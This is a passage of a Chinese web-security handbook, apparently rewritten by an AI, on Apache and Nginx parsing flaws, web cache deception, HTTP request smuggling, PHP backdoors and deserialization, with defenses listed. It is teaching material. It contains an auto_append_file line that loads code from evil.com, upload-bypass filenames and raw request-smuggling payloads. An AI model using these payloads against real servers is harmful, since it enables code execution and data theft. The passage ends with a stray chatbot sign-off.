### 132 Chapter 4. 常见漏洞攻防
**Web-Sec Documentation, 发布 1.0**

(续上页)

#### PHP 配置漏洞
- `#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B`
- `#php_value auto_append_file https://evil.com/evil-code.txt`

#### 目录遍历
当配置了 `Options +Indexes` 时，Apache 存在目录遍历漏洞。例如：
- **CVE-2017-15715**: `%0A` 绕过上传黑名单。
- **lighttpd**: `xx.jpg/xx.php`

**参考链接**
- Apache 上传绕过

#### Nginx 解析漏洞
##### Fast-CGI 关闭
- 当 Fast-CGI 关闭时，Nginx 仍然存在解析漏洞：在文件路径（如 `xx.jpg`）后面加上 `%00.php`，即 `xx.jpg%00.php` 会被当作 PHP 文件解析。

##### Fast-CGI 开启
- 当 Fast-CGI 开启时，在文件路径后加上 `/xx.php`，则 `xx.jpg/xx.php` 会被解析为 PHP 文件。
- **CVE-2013-4547**: `a.jpg\x20\x00.php`

##### 配置错误导致的目录穿越
- 如果配置中存在类似 `location /foo { alias /bar/; }` 的设置，`/foo../` 会被解析为 `/bar/../`，从而导致目录穿越。

### 133 Chapter 4. 中间件
**Web-Sec Documentation, 发布 1.0**

#### 目录遍历
- 当 `autoindex on` 开启时，Nginx 中存在目录遍历漏洞。

**参考链接**
- CVE-2013-4547 Nginx 解析漏洞深入利用及分析

### 4.16 Web Cache 欺骗攻击
#### 4.16.1 简介
网站通常通过 CDN、负载均衡器或反向代理实现 Web 缓存功能，以降低服务器响应延迟。缓存主要针对静态文件（如 CSS、JS、图片等），而动态生成的页面（如包含用户个人信息的页面）不会被缓存。

#### 4.16.2 漏洞成因
- 当代理服务器设置为缓存静态文件并忽略这些文件的缓存头时，访问 `http://www.example.com/home.php/no-existent.css` 会导致以下流程：
  1. 浏览器请求 `http://www.example.com/home.php/no-existent.css`。
  2. 服务器返回 `http://www.example.com/home.php` 的内容。
  3. 响应经过代理服务器。
  4. 代理识别该文件有 `.css` 后缀。
  5. 在缓存目录下，代理服务器创建 `home.php` 目录，并将返回的内容作为 `non-existent.css` 保存。

#### 4.16.3 漏洞利用
- 攻击者欺骗用户访问 `http://www.example.com/home.php/logo.png?www.myhack58.com`，导致含有用户个人信息的页面被缓存，从而能被公开访问。如果返回的内容包含 session 标识、安全问题的答案或 CSRF token，攻击者可以进一步获取这些信息。

#### 4.16.4 漏洞存在的条件
- 至少需要满足以下两个条件：
  1. Web 缓存功能根据扩展进行保存，并忽略缓存头。
  2. 访问不存在的页面（如 `http://www.example.com/home.php/non-existent.css`）会返回 `home.php` 的内容。

#### 4.16.5 漏洞防御
- 主要措施包括：
  1. 设置缓存机制，仅缓存允许的文件。
  2. 根据 content-type 进行缓存。
  3. 对于不存在的页面，返回 404 或 302。

#### 4.16.6 实例
- **Paypal**: 未修复之前，攻击者可以通过此漏洞获取用户姓名、账户金额、信用卡最后四位数、交易数据和电子邮件地址等信息。受影响的页面包括：
  - `https://www.paypal.com/myaccount/home/attack.css`
  - `https://www.paypal.com/myaccount/settings/notifications/attack.css`
  - `https://history.paypal.com/cgi-bin/webscr/attack.css?cmd=_history-details`

**参考链接**
- practical web cache poisoning
- End-UsersGetManeuvered: EmpiricalAnalysisofRedirectionHijackinginContentDeliveryNetworks

### 4.17 HTTP 请求走私
#### 4.17.1 简介
HTTP 请求走私是一种干扰网站处理 HTTP 请求序列的技术，最早在 2005 年提出。

#### 4.17.2 成因
- 请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。HTTP 规范提供了两种不同的方法来指定请求的结束位置：`Content-Length` 和 `Transfer-Encoding` 标头。

#### 4.17.3 分类
- **CLTE**: 前端服务器使用 `Content-Length` 头，后端服务器使用 `Transfer-Encoding` 头。
- **TECL**: 前端服务器使用 `Transfer-Encoding` 标头，后端服务器使用 `Content-Length` 标头。
- **TETE**: 前端和后端服务器都支持 `Transfer-Encoding` 标头，但可以通过某种方式诱导其中一个服务器不处理它。

#### 4.17.4 攻击示例
- **CL 不为 0 的 GET 请求**:
  ```http
  GET / HTTP/1.1\r\n
  Host: example.com\r\n
  Content-Length: 44\r\n
  GET /secret HTTP/1.1\r\n
  Host: example.com\r\n
  \r\n
  ```
  前端服务器处理了 `Content-Length`，而后端服务器没有处理，基于 pipeline 机制认为这是两个独立的请求，造成漏洞。

- **CL-CL**:
  ```http
  POST / HTTP/1.1\r\n
  Host: example.com\r\n
  Content-Length: 8\r\n
  Content-Length: 7\r\n
  12345\r\n
  a
  ```
  这个例子中 `a` 会被带入下一个请求，变为 `aGET / HTTP/1.1\r\n`。

- **CL-TE**:
  ```http
  POST / HTTP/1.1\r\n
  Host: example.com\r\n
  ...
  Connection: keep-alive\r\n
  Content-Length: 6\r\n
  Transfer-Encoding: chunked\r\n
  \r\n
  0\r\n
  \r\n
  a
  ```
  这个例子中 `a` 也会被带入下一个请求，变为 `aGET / HTTP/1.1\r\n`。

- **TE-CL**:
  ```http
  POST / HTTP/1.1\r\n
  Host: example.com\r\n
  ...
  Content-Length: 4\r\n
  Transfer-Encoding: chunked\r\n
  \r\n
  12\r\n
  aPOST / HTTP/1.1\r\n
  \r\n
  0\r\n
  \r\n
  ```

- **TE-TE**:
  ```http
  POST / HTTP/1.1\r\n
  Host: example.com\r\n
  ...
  Content-length: 4\r\n
  Transfer-Encoding: chunked\r\n
  Transfer-encoding: cow\r\n
  \r\n
  5c\r\n
  aPOST / HTTP/1.1\r\n
  Content-Type: application/x-www-form-urlencoded\r\n
  Content-Length: 15\r\n
  \r\n
  x=1\r\n
  0\r\n
  \r\n
  ```

#### 4.17.5 防御
- 禁用后端连接重用。
- 确保连接中的所有服务器具有相同的配置。
- 拒绝有二义性的请求。

**参考链接**
- RFC 2616 Hypertext Transfer Protocol – HTTP/1.1
- RFC 7230 Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing – HTTP/1.1
- HTTP Request Smuggling by chaiml
- HTTP request smuggling by portswigger
- 从一道题到协议层攻击之 HTTP 请求走私
- HTTP Request Smuggling in 2020
- h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)

### 140 Chapter 4. 常见漏洞攻防
**Web-Sec Documentation, 发布 1.0**

### 5. 语言与框架
#### 5.1 PHP
##### 5.1.1 后门
- **php.ini 构成的后门**:
  - 利用 `auto_prepend_file` 和 `include_path`。
  - `.user.ini` 文件构成的 PHP 后门：`.user.ini` 可运行于所有以 FastCGI 运行的服务器。利用方式同 `php.ini`。

##### 5.1.2 反序列化
- **PHP 序列化实现**:
  - PHP 提供了几种序列化处理器：`php`、`php_serialize`、`php_binary` 和 `WDDX`（需编译时开启支持）。默认为 `php`，可通过 `session.serialize_handler` 配置修改。
  - 如果 PHP 编译时加入了 WDDX 支持，则只能用 WDDX，WDDX 从 PHP 7.4 版本后开始弃用。从 PHP 5.5.4 起可以使用 `php_serialize`。`php_serialize` 在内部简单地直接使用 `serialize/unserialize` 函数，并且不会有 `php` 和 `php_binary` 所具有的限制。

- **序列化格式**:
  - **php_serialize**:
    - `boolean`: `b:1;`（true），`b:0;`（false）
    - `integer`: `i:...;`
    - `double`: `d:...;`
    - `NULL`: `N;`
    - `string`: `s:...:"...";`
    - `array`: `a:...:{...}`
    - `object`: `O:...:"...":...:{...}`
    - `reference`: `R:...;`

- **private 与 protected**:
  - `private` 属性只能在其被定义的类内部访问，且不会被继承，在属性前加上类名，即 `%00className%00` 用于标定其是私有的。
  - `protected` 属性可以在父类和子类中访问，变量前添加 `%00*%00` 用于标定其是受保护的。

- **PHP 反序列化漏洞**:
  - PHP 在反序列化时会调用 `__wakeup`/`__sleep` 等函数，可能会造成代码执行等问题。若没有相关函数，在析构时也会调用相关的析构函数，同样会造成代码执行。
  - `__toString`/`__call` 也有利用的可能。
  - `__wakeup` 在反序列化时被触发，`__destruct` 在 GC 时被触发，`__toString` 在 `echo` 时被触发，`__call` 在一个未被定义的函数调用时被触发。

**示例代码**:
```php
class Demo
{
    public $data;

    public function __construct($data)
    {
        $this->data = $data;
    }

    public function __wakeup()
    {
        // 反序列化时调用
    }

    public function __destruct()
    {
        // 析构时调用
    }

    public function __toString()
    {
        // echo 时调用
        return "Demo object with data: " . $this->data;
    }

    public function __call($name, $arguments)
    {
        // 未定义的方法调用时调用
    }
}
```

希望这些优化后的文本能够帮助你更好地理解和传达相关信息。如果有任何进一步的问题或需要更多帮助，请告诉我！